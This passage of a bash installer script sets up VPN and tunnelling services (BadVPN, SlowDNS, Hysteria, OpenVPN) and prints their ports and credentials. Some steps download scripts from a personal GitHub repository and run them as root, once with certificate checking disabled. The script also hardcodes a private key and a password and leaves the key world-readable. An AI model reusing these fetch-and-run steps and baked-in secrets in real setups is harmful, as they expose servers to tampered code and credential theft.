echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Restarting Stunnel." | lolcat
systemctl restart stunnel4 2>/dev/null || systemctl restart stunnel
  }
  reset
  echo -e "[\e[32mInfo\e[0m] Installing Stunnel Complete."
  reset
}

install_badvpn(){
reset
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing BadVPN." | lolcat
{
wget -q -O /usr/bin/badvpn-udpgw  "https://raw.githubusercontent.com/nontikweed/aio/main/badvpn-udpgw64"
chmod +x /usr/bin/badvpn-udpgw
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Configuring BadVPN." | lolcat
echo "[Unit]
Description=BadVPN UDP Gateway by Nontikweed

[Service]
ExecStart=/usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
Restart=always
User=nobody
Group=nogroup

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/badvpn.service

        echo -e "[\e[33mNotice\e[0m] Reloading systemd daemon."
        systemctl daemon-reload > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Enabling BadVPN Service..."
        sudo systemctl enable badvpn > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Starting BadVPN Service..."
        sudo systemctl start badvpn.service > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Checking the status of BadVPN Service."
        if sudo systemctl is-active badvpn.service &> /dev/null; then
        echo -e "[\e[33mNotice\e[0m] BadVPN service is running."
        else
        echo -e "[\e[33mNotice\e[0m] BadVPN service is not running."
        fi
}
reset
echo -e "[\e[32mInfo\e[0m] Installing BadVPN Complete."
reset
}

install_slowdns() {
    reset
    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing SlowDNS." | lolcat
    {  

        echo -e "[\e[32mInfo\e[0m] Creating SlowDNS directory."
        mkdir -p -m 755 /etc/slowdns
        cd /etc/slowdns
        curl -s -o dns.sh "https://raw.githubusercontent.com/nontikweed/aio/main/autodns" && chmod +x dns.sh && ./dns.sh  
        echo -e "[\e[32mInfo\e[0m] Downloading SlowDNS Files."
        wget  https://raw.githubusercontent.com/nontikweed/aio/main/slowdns > /dev/null 2>&1
        echo '39a475f6c980d39007ae00e1c8f922b5eb1bd88b33071919a735cdafb5ab2389' >> server.key
        echo '15f2caeefeb017bab2ca8f5c72e3d3719333f3f56a8ca2078480109772f6406c' >> server.pub
        sudo chmod +x /etc/slowdns/slowdns

        NSNAME="$(cat /etc/slowdns/ns.txt)"
        echo "Configuring SlowDNS service..."
        echo "[Unit]
Description=Server SlowDNS By Nontikweed
Documentation=https://nethubvpn.net
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/etc/slowdns/slowdns -udp :5300 -privkey-file /etc/slowdns/server.key $NSNAME 127.0.0.1:2121
Restart=on-failure

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/slowdns.service

        echo -e "[\e[33mNotice\e[0m] Reloading systemd daemon."
        systemctl daemon-reload > /dev/null 2>&1 

        echo -e "[\e[33mNotice\e[0m] Enabling SlowDNS service..."
        sudo systemctl enable slowdns > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Starting SlowDNS service..."
        sudo systemctl start slowdns.service > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Checking the status of SlowDNS service..."
        if sudo systemctl is-active slowdns.service &> /dev/null; then
        echo -e "[\e[33mNotice\e[0m] SlowDNS service is running."
        else
        echo -e "[\e[33mNotice\e[0m] SlowDNS service is not running."
        fi
    }
    reset
    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing SlowDNS Complete." | lolcat
    reset
}

install_hysteria(){
reset
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Hysteria." | lolcat
{
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Downloading Hysteria." | lolcat
wget -N --no-check-certificate  -q -O ~/install_server.sh https://raw.githubusercontent.com/nontikweed/blaire69/master/install_server.sh
chmod +x ~/install_server.sh
~/install_server.sh --version v1.3.5

echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Configuring Hysteria." | lolcat
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Bulacan/L=Central Luzon/O=Nethub VPN/OU=IT Department/CN=Nontikweed" -keyout "/etc/hysteria/hysteria.key" -out "/etc/hysteria/hysteria.crt" >/dev/null 2>&1

rm -f /etc/hysteria/config.json

cat <<EOF > /etc/hysteria/config.json
{
  "listen": ":5666",
  "cert": "/etc/hysteria/hysteria.crt",
  "key": "/etc/hysteria/hysteria.key",
  "up_mbps": 100,
  "down_mbps": 100,
  "disable_udp": false,
  "obfs": "${HY2_OBFS:-nontikweed}",
  "auth": {
    "mode": "passwords",
    "config": ["blaire"]
  }
}
EOF

chmod 755 /etc/hysteria/config.json
chmod 755 /etc/hysteria/hysteria.crt
chmod 755 /etc/hysteria/hysteria.key

sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216

echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Enabling Hysteria Server." | lolcat
sudo systemctl enable hysteria-server.service > /dev/null 2>&1

echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Restart Hysteria Server." | lolcat
sudo systemctl restart hysteria-server.service > /dev/null 2>&1
}
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Hysteria installation complete." | lolcat
}

start_service () {
reset
{
rm -rf /root/*.sh
rm -rf /root/*.sh.x
rm -rf /etc/slowdns/*.sh
echo -e ""
echo -e "\033[0;35m═══════════════════════════════════════════════\033[0m" | lolcat
echo -e "\033[0;31m  ██████╗ ██╗      █████╗ ██╗██████╗ ███████╗\033[0m" | lolcat
echo -e "\033[0;33m  ██╔══██╗██║     ██╔══██╗██║██╔══██╗██╔════╝\033[0m" | lolcat
echo -e "\033[0;32m  ██████╔╝██║     ███████║██║██████╔╝█████╗  \033[0m" | lolcat
echo -e "\033[0;36m  ██╔══██╗██║     ██╔══██║██║██╔══██╗██╔══╝  \033[0m" | lolcat
echo -e "\033[0;34m  ██████╔╝███████╗██║  ██║██║██║  ██║███████╗\033[0m" | lolcat
echo -e "\033[0;35m  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝\033[0m" | lolcat
echo -e "\033[0;35m═════════════════════════════════════════════\033[0m" | lolcat
echo -e ""
echo -e "AIO Script Successfully Installed! | Date : $date " | lolcat 
echo -e ""
echo -e "Operating System: $(neofetch --stdout | grep 'OS' | awk -F ':' '{print $2}' | tr -d '[:space:]')" | lolcat
echo -e "CPU: $(neofetch --stdout | grep 'CPU' | awk -F ':' '{print $2}' | tr -d '[:space:]')" | lolcat
echo -e "Disk: $(neofetch disk --stdout | grep -oP '(\d+(\.\d+)?[GMKB])? /\s*\d+(\.\d+)?[GMKB] \(\d+%\) ')" | lolcat
echo -e "Uptime: $(neofetch --uptime --stdout | grep 'Uptime' | awk -F ': ' '{print $2}')" | lolcat
echo -e ""
echo -e "OpenSSH Port: $(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g' )" | lolcat
echo -e "Stunnel Port: $(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')" | lolcat
echo -e "DropbearSSH Port: $(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')" | lolcat
echo -e "Squid Port: $(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')" | lolcat
echo -e "BadVPN Port: $(netstat -nlpt | grep -i badvpn-udpgw | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')" | lolcat
echo -e "SSH WS Port: 80" | lolcat
echo -e "OpenVPN WS Port: 81" | lolcat
echo -e ""
echo -e "SlowDNS Configuration" | lolcat
echo -e "Host: $(wget -4qO- http://ipinfo.io/ip)" | lolcat 
echo -e "SlowDNS Port: $(netstat -nlptu | awk '/slowdns/ && /udp6/ {gsub(/.*:/, "", $4); print $4}')" | lolcat 
echo -e "Public Key: $(cat /etc/slowdns/server.pub)" | lolcat
echo -e "Nameserver : $(cat /etc/slowdns/ns.txt)" | lolcat
echo -e "Subdomain : $(cat /etc/slowdns/subd.txt)" | lolcat 
echo -e ""
echo -e "Hysteria Configuration" | lolcat
echo -e "Hysteria Port: $(netstat -nlptu | awk '/hysteria/ && /udp6/ {gsub(/.*:/, "", $4); ports = ports $4 ", "} END {print substr(ports, 1, length(ports)-2)}') [20000-50000]" | lolcat
echo -e "Hysteria OBFS: $(jq -r '.obfs' /etc/hysteria/config.json)" | lolcat
echo -e "Hysteria Password: $(jq -r '.auth.config[0]' /etc/hysteria/config.json)" | lolcat
echo -e ""
echo -e "OpenVPN Configuration" | lolcat
echo -e "OpenVPN TCP Ports: $(netstat -nlpt | awk '/openvpn/ && $4 ~ /0.0.0.0/ {gsub(/.*:/, "", $4); ports = ports $4 ", "} END {print substr(ports, 1, length(ports)-2)}')" | lolcat
echo -e "OpenVPN UDP Ports: $(netstat -nulp | awk '/openvpn/ && $4 ~ /0.0.0.0:/ {split($4, a, ":"); ports = ports a[2] ", "} END {print substr(ports, 1, length(ports)-2)}')" | lolcat
echo -e ""
 }
}

install_dependencies
install_ssh
install_dropbear
install_squid
install_openvpn
install_stunnel
install_badvpn
install_slowdns
install_hysteria
install_firewall_kvm
start_service
